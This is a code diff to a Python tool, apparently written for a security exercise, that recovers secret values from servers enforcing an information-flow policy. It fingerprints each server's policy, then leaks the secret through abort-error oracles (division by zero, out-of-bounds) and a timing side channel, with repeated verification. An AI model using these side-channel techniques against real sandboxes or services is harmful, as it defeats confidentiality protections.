@@ -206,6 +206,13 @@ VERIFY_INPUT_PROGRAM = """int main(int input, int secret) {
 """
 
 
+def make_verify_constant_program(candidate: int) -> str:
+    return f"""int main(int input, int secret) {{
+  return {candidate};
+}}
+"""
+
+
 @dataclass
 class QueryResult:
     kind: str
@@ -383,6 +390,23 @@ def verify_secret_candidate(
 ) -> bool:
     if candidate < SECRET_MIN or candidate >= SECRET_MAX_EXCLUSIVE:
         return False
+
+    # Preferred verifier: constant return avoids relying on whether a
+    # server allows low input to flow to output.
+    with ProgramFile(make_verify_constant_program(candidate)) as path:
+        res = run_query(
+            server_command=server_command,
+            userid=userid,
+            program_path=path,
+            input_value=0,
+            timeout_s=timeout_s,
+        )
+    if res.kind == "success":
+        return True
+    if res.kind == "failure":
+        return False
+
+    # Fallback verifier for servers that reject huge constants.
     with ProgramFile(VERIFY_INPUT_PROGRAM) as path:
         res = run_query(
             server_command=server_command,
@@ -391,7 +415,7 @@ def verify_secret_candidate(
             input_value=candidate,
             timeout_s=timeout_s,
         )
-        return res.kind == "success"
+    return res.kind == "success"
 
 
 def verify_nearby_candidates(
@@ -727,6 +751,7 @@ def recover_from_timing_oracle(
     sc_term_candidates = [200, 400, 800, 1600, 3200, 6400]
     min_ratio = 1.008
     min_gap_s = 0.0004
+    min_boundary_consistency = 0.70
 
     candidates: list[tuple[str, str]] = []
     for burn in burn_candidates:
@@ -802,12 +827,30 @@ def recover_from_timing_oracle(
                         votes_true += 1
                 return votes_true >= 2
 
-            boundary_lo = classify(SECRET_MIN)
-            boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
+            def boundary_vote(mid: int, checks: int = 7) -> tuple[bool, float]:
+                true_count = 0
+                for _ in range(checks):
+                    if classify(mid):
+                        true_count += 1
+                frac_true = true_count / checks
+                if frac_true >= 0.5:
+                    return True, frac_true
+                return False, 1.0 - frac_true
+
+            boundary_lo, conf_lo = boundary_vote(SECRET_MIN)
+            boundary_hi, conf_hi = boundary_vote(SECRET_MAX_EXCLUSIVE)
+            if conf_lo < min_boundary_consistency or conf_hi < min_boundary_consistency:
+                last_failure = (
+                    "timing boundary too noisy "
+                    f"for {candidate_name} (conf_lo={conf_lo:.2f}, conf_hi={conf_hi:.2f})"
+                )
+                debug_log(debug, f"[timing] {last_failure}")
+                continue
             if boundary_lo == boundary_hi:
                 last_failure = (
                     "timing boundary check failed "
-                    f"for {candidate_name} (at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
+                    f"for {candidate_name} (at 0 => {boundary_lo}, at 2^62 => {boundary_hi}, "
+                    f"conf_lo={conf_lo:.2f}, conf_hi={conf_hi:.2f})"
                 )
                 debug_log(debug, f"[timing] {last_failure}")
                 continue
@@ -856,7 +899,40 @@ def recover_server_secret(
         f"[serve{server_idx}] using query-timeout={tuned_query_timeout:.2f}s "
         f"timing-timeout={tuned_timing_timeout:.2f}s",
     )
-    strategies: list[tuple[str, Callable[[], int]]] = [
+    def probe_kind(program_source: str, *, input_value: int = 0) -> str:
+        with ProgramFile(program_source) as path:
+            res = run_query(
+                server_command=server_command,
+                userid=userid,
+                program_path=path,
+                input_value=input_value,
+                timeout_s=tuned_query_timeout,
+            )
+        return res.kind
+
+    direct_kind = probe_kind(DIRECT_FLOW_PROGRAM, input_value=0)
+    implicit_kind = probe_kind(IMPLICIT_BOOLEAN_PROGRAM, input_value=0)
+    abort_kind = probe_kind(ABORT_ERROR_ORACLE_PROGRAM, input_value=0)
+    expr_and_kind = probe_kind(EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM, input_value=0)
+
+    strict_policy_mode = (
+        direct_kind == "insecure"
+        and implicit_kind == "insecure"
+        and abort_kind == "insecure"
+    )
+    if debug:
+        debug_log(
+            True,
+            f"[serve{server_idx}] fingerprint direct={direct_kind} implicit={implicit_kind} "
+            f"abort={abort_kind} expr-and={expr_and_kind}",
+        )
+        if strict_policy_mode:
+            debug_log(
+                True,
+                f"[serve{server_idx}] strict-policy mode enabled (most classic channels rejected as insecure)",
+            )
+
+    full_strategies: list[tuple[str, Callable[[], int]]] = [
         (
             "direct explicit flow",
             lambda: recover_direct(
@@ -1112,6 +1188,52 @@ def recover_server_secret(
             ),
         ),
     ]
+    strict_mode_strategies: list[tuple[str, Callable[[], int]]] = [
+        (
+            "expr abort oracle (&& div0)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "expr abort oracle (&& mod0)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "expr abort oracle (&& oob)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=EXPR_ABORT_AND_OOB_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "timing oracle",
+            lambda: recover_from_timing_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_timing_timeout,
+                repeats=timing_repeats,
+                debug=debug,
+            ),
+        ),
+    ]
+    strategies = strict_mode_strategies if strict_policy_mode else full_strategies
 
     for strategy_name, strategy_fn in strategies:
         secret = attempt_strategy(
@@ -1121,12 +1243,24 @@ def recover_server_secret(
             debug=debug,
         )
         if secret is not None:
-            verified = verify_nearby_candidates(
-                server_command=server_command,
-                userid=userid,
-                candidate=secret,
-                timeout_s=tuned_query_timeout,
-            )
+            verify_passes = 0
+            verify_attempts = 5 if strategy_name == "timing oracle" else 1
+            verified_value: Optional[int] = None
+            for _ in range(verify_attempts):
+                verified = verify_nearby_candidates(
+                    server_command=server_command,
+                    userid=userid,
+                    candidate=secret,
+                    timeout_s=tuned_query_timeout,
+                )
+                if verified is not None:
+                    verify_passes += 1
+                    verified_value = verified
+            required_passes = 3 if strategy_name == "timing oracle" else 1
+            if verify_passes >= required_passes and verified_value is not None:
+                verified = verified_value
+            else:
+                verified = None
             if verified is not None:
                 if verified != secret:
                     debug_log(
@@ -1136,7 +1270,8 @@ def recover_server_secret(
                 return verified
             debug_log(
                 debug,
-                f"[serve{server_idx}] candidate {secret} from {strategy_name} failed verification",
+                f"[serve{server_idx}] candidate {secret} from {strategy_name} failed verification "
+                f"({verify_passes}/{verify_attempts})",
             )
     return None
 
